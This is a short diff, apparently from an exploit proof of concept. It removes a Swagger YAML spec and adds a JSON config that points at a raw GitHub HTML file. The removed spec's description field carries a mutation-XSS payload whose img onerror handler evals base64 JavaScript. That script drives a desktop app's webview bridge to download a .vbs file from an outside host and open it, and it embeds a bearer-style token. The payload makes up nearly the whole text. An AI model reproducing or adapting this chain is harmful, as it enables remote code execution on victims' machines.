@@ -1,11 +1,9 @@
-swagger: '2.0'
-info:
-  version: "0.0.1"
-  title: resources
-  description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=eval(atob('dmFyIGg7CnZhciByID0gKGUpID0+IHsKICAgIGNvbnNvbGUubG9nKEpTT04uc3RyaW5naWZ5KGUuZGF0YSkpCiAgICAvLyBleGVjCiAgICBpZiAoZS5kYXRhLmRhdGEuZG9jICYmIGUuZGF0YS5kYXRhLmRvYy5wYXRoKSB7CiAgICAgICAgY29uc29sZS5sb2coImdldCBkb3duIikKICAgICAgICBjb25zb2xlLmxvZyhlLmRhdGEuZGF0YS5kb2MucGF0aCkKICAgICAgICB2YXIgbXNnID0geyAianNDYWxsSWQiOiAiaWRjZmI5NGYxZjdmNzEzIiwgImFwaU5hbWUiOiAib3BlbkRvY3VtZW50cyIsICJkYXRhIjogeyAiZG9jcyI6IFt7ICJpZCI6ICJ6dmFUcC1zOFRzdWQ4aHozdC1xekRnIiwgInBhdGgiOiBlLmRhdGEuZGF0YS5kb2MucGF0aCB9XSB9IH0KICAgICAgICBjb25zb2xlLmxvZyhtc2cpCiAgICAgICAgaC5wb3N0TWVzc2FnZShKU09OLnN0cmluZ2lmeShtc2cpKQogICAgICAgIGNvbnNvbGUubG9nKCJmaW4iKQogICAgfQp9CmggPSB3aW5kb3cuY2hyb21lLndlYnZpZXcKaC5hZGRFdmVudExpc3RlbmVyKCJtZXNzYWdlIiwgcikKY29uc29sZS5sb2coImRvd25sb2FkIikKLy8gZG93bmxvYWQKaC5wb3N0TWVzc2FnZSgneyJqc0NhbGxJZCI6ImlkZTBhZTcwMDZkM2I2ZCIsImFwaU5hbWUiOiJkb3dubG9hZERvY3VtZW50cyIsImRhdGEiOnsiZG9jcyI6W3siaWQiOiJ1V2RHMzVyeVJRdTRWTW0xb2dMM3BBIiwidXJsIjoiaHR0cHM6Ly9maWxlLnpvb21kZXYudXMvZmlsZS9ZZ1BNd2c5TlFkaUhyaXFseEs1a2hnP2NoYW5uZWw9NzciLCJuYW1lIjoidGVzdDUudmJzIn1dLCJ6bWsiOiJleUp6ZGlJNklqQXdNREF3TWlJc0ltRnNaeUk2SWtoVE5URXlJaXdpZGlJNklqSXVNQ0lzSW10cFpDSTZJalE1Tm1NM09HTm1MVFV4T0dZdE5ESXpNeTA0TVRBeUxUTmpabVV4TmpjeE9XWTFPQ0o5LmV5SmhkV1FpT2lKdGRIVWlMQ0oxYVdRaU9pSjFhVXRyV0dKMGNWRktNblpCWkVOcmNFOTVPVVZSSWl3aWJtSm1Jam94TmpnNE16WTBOemcxTENKamMzSWlPaUlpTENKcWFXUWlPaUoxYVd0cmVHSjBjWEZxTW5aaFpHTnJjRzk1T1dWeFFIaHRjSEJrWlhZdWVtOXZiUzUxY3lJc0lteHZaMmRsWkNJNmRISjFaU3dpYVhOeklqb2lhSFIwY0hNNkx5OTNaV0l1ZW05dmJTNTFjeUlzSW1WNGNDSTZNVFk0T0RRM01qYzROU3dpYVdGMElqb3hOamc0TXpZME56ZzFMQ0pxZEdraU9pSmpNakV6Tnpsak5DMWtZakUwTFRSbE5UTXRPRFUxTkMwME0yTXpZbU5sWXpWa1pEZ2lMQ0p0Ym04aU9qazFNekUyTlRVek1EYzJmUS41V05ZWHNpY25rTVpaTDhXV0VKRl9LZUVFaGZQdmNsc29CYVFHc2tMVDEtZ190amVQQTBQblJaajh3UjhSRVczZFlNb1dSTFFSR1ZNWlVLVWpsdUpsQSJ9fScpCg==')) src=1>"></form>
-paths:
-  /:
-    get:
-      responses:
-        200:
-          description: Success
+{
+    "url": "https://raw.githubusercontent.com/James472/test/main/zzz.html",
+    "urls": [
+        {
+            "url": "https://raw.githubusercontent.com/James472/test/main/zzz.html",
+            "name": "Foo"
+        }
+    ]
+}
